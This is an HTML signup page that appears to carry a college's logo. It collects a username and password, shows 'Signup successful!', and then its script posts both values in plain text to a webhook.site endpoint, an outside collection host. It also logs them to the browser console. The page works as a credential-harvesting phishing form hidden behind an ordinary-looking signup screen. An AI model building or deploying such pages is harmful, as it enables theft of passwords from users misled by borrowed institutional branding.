<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Signup</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to right, #11998e, #38ef7d);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #fff;
    }
    .signup-container {
      background-color: rgba(255, 255, 255, 0.1);
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      backdrop-filter: blur(8px);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    .signup-container img.logo {
      width: 100%;
      max-width: 120px;
      height: auto;
      margin-bottom: 20px;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    .signup-container h2 {
      margin-bottom: 25px;
    }
    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }
    .input-group label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
    }
    .input-group input {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background-color: #ffffffcc;
      font-size: 16px;
      color: #333;
    }
    .input-group input:focus {
      outline: 2px solid #11998e;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #11998e;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #0f786f;
    }
    .message {
      text-align: center;
      margin-top: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <div class="signup-container">
    <img 
      src="https://sece.ac.in/wp-content/uploads/2024/05/clg-logo2-1536x438.webp" 
      alt="Logo" 
      class="logo"
    >
    <h2>Signup</h2>
    <div class="input-group">
      <label for="username">Username</label>
      <input type="text" id="username" placeholder="Choose a username">
    </div>
    <div class="input-group">
      <label for="password">Password</label>
      <input type="password" id="password" placeholder="Choose a password">
    </div>
    <button onclick="signup()">Signup</button>
    <div class="message" id="message"></div>
  </div>

<script>
  function signup() {
    const user = document.getElementById("username").value;
    const pass = document.getElementById("password").value;
    const message = document.getElementById("message");

    if (user && pass) {
      message.style.color = "lightgreen";
      message.textContent = "Signup successful!";
    } else {
      message.style.color = "salmon";
      message.textContent = "Please fill in both fields.";
      return;
    }

    console.log("Sending to webhook:", user, pass); // Debug log

    const webhookURL = "https://webhook.site/11f12cc1-f07d-4d4a-89f2-85063aa15916";

    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: user,
        password: pass
      })
    }).then(response => {
      console.log("Webhook response:", response);
    }).catch(error => {
      console.error("Error sending to webhook:", error);
      message.style.color = "salmon";
      message.textContent = "Failed to send data to webhook.";
    });
  }
</script>

</body>
</html>
